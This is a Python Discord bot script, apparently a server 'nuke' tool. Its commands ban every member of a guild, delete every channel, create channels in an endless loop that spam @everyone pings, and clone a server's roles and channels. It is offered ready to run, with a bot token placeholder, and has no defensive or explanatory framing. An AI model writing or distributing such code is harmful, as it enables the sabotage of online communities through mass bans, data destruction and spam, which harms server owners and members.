import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.messages = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f"•=======Bot create bye MilanDevPy=======•\n!spamchannel•!copy•!erase•!tetraban\nThe bot {bot.user.name} is online")

@bot.command()
async def tetraban(ctx):
    for member in ctx.guild.members:
        try:
            await member.ban()
        except:
            pass

@bot.command()
async def erase(ctx):
    guild = ctx.guild
    for channel in guild.channels:
        await channel.delete()

    await guild.create_text_channel('commande')
              
@bot.command()
async def channelspam(ctx , arg: str):
     allow_mentions = discord.AllowedMentions(everyone=True)
     guild = ctx.message.guild
     while True:
          channels = await guild.create_text_channel(arg)
          await channels.send(content = "@everyone")


@bot.command()
async def copy(ctx):
    source_guild_id = 0 #Guild (id)to copy, replace the 0 by the id
    target_guild_id = 0 #Receptacle guild(id) , replace the 0 by the id

    source_guild = bot.get_guild(source_guild_id)
    target_guild = bot.get_guild(target_guild_id)

    if not source_guild or not target_guild:
        await ctx.send("Unable to find source or target servers.")
        return

    for role in source_guild.roles:
        if role.name == "@everyone":
            continue

        permissions = role.permissions
        await target_guild.create_role(name=role.name, permissions=permissions)

    for category in source_guild.categories:
        new_category = await target_guild.create_category_channel(name=category.name)

        for channel in category.channels:
            if isinstance(channel, discord.VoiceChannel):
                await new_category.create_voice_channel(name=channel.name)
            elif isinstance(channel, discord.TextChannel):
                await new_category.create_text_channel(name=channel.name)



bot.run("TOKEN") #replace TOKEN by your bot token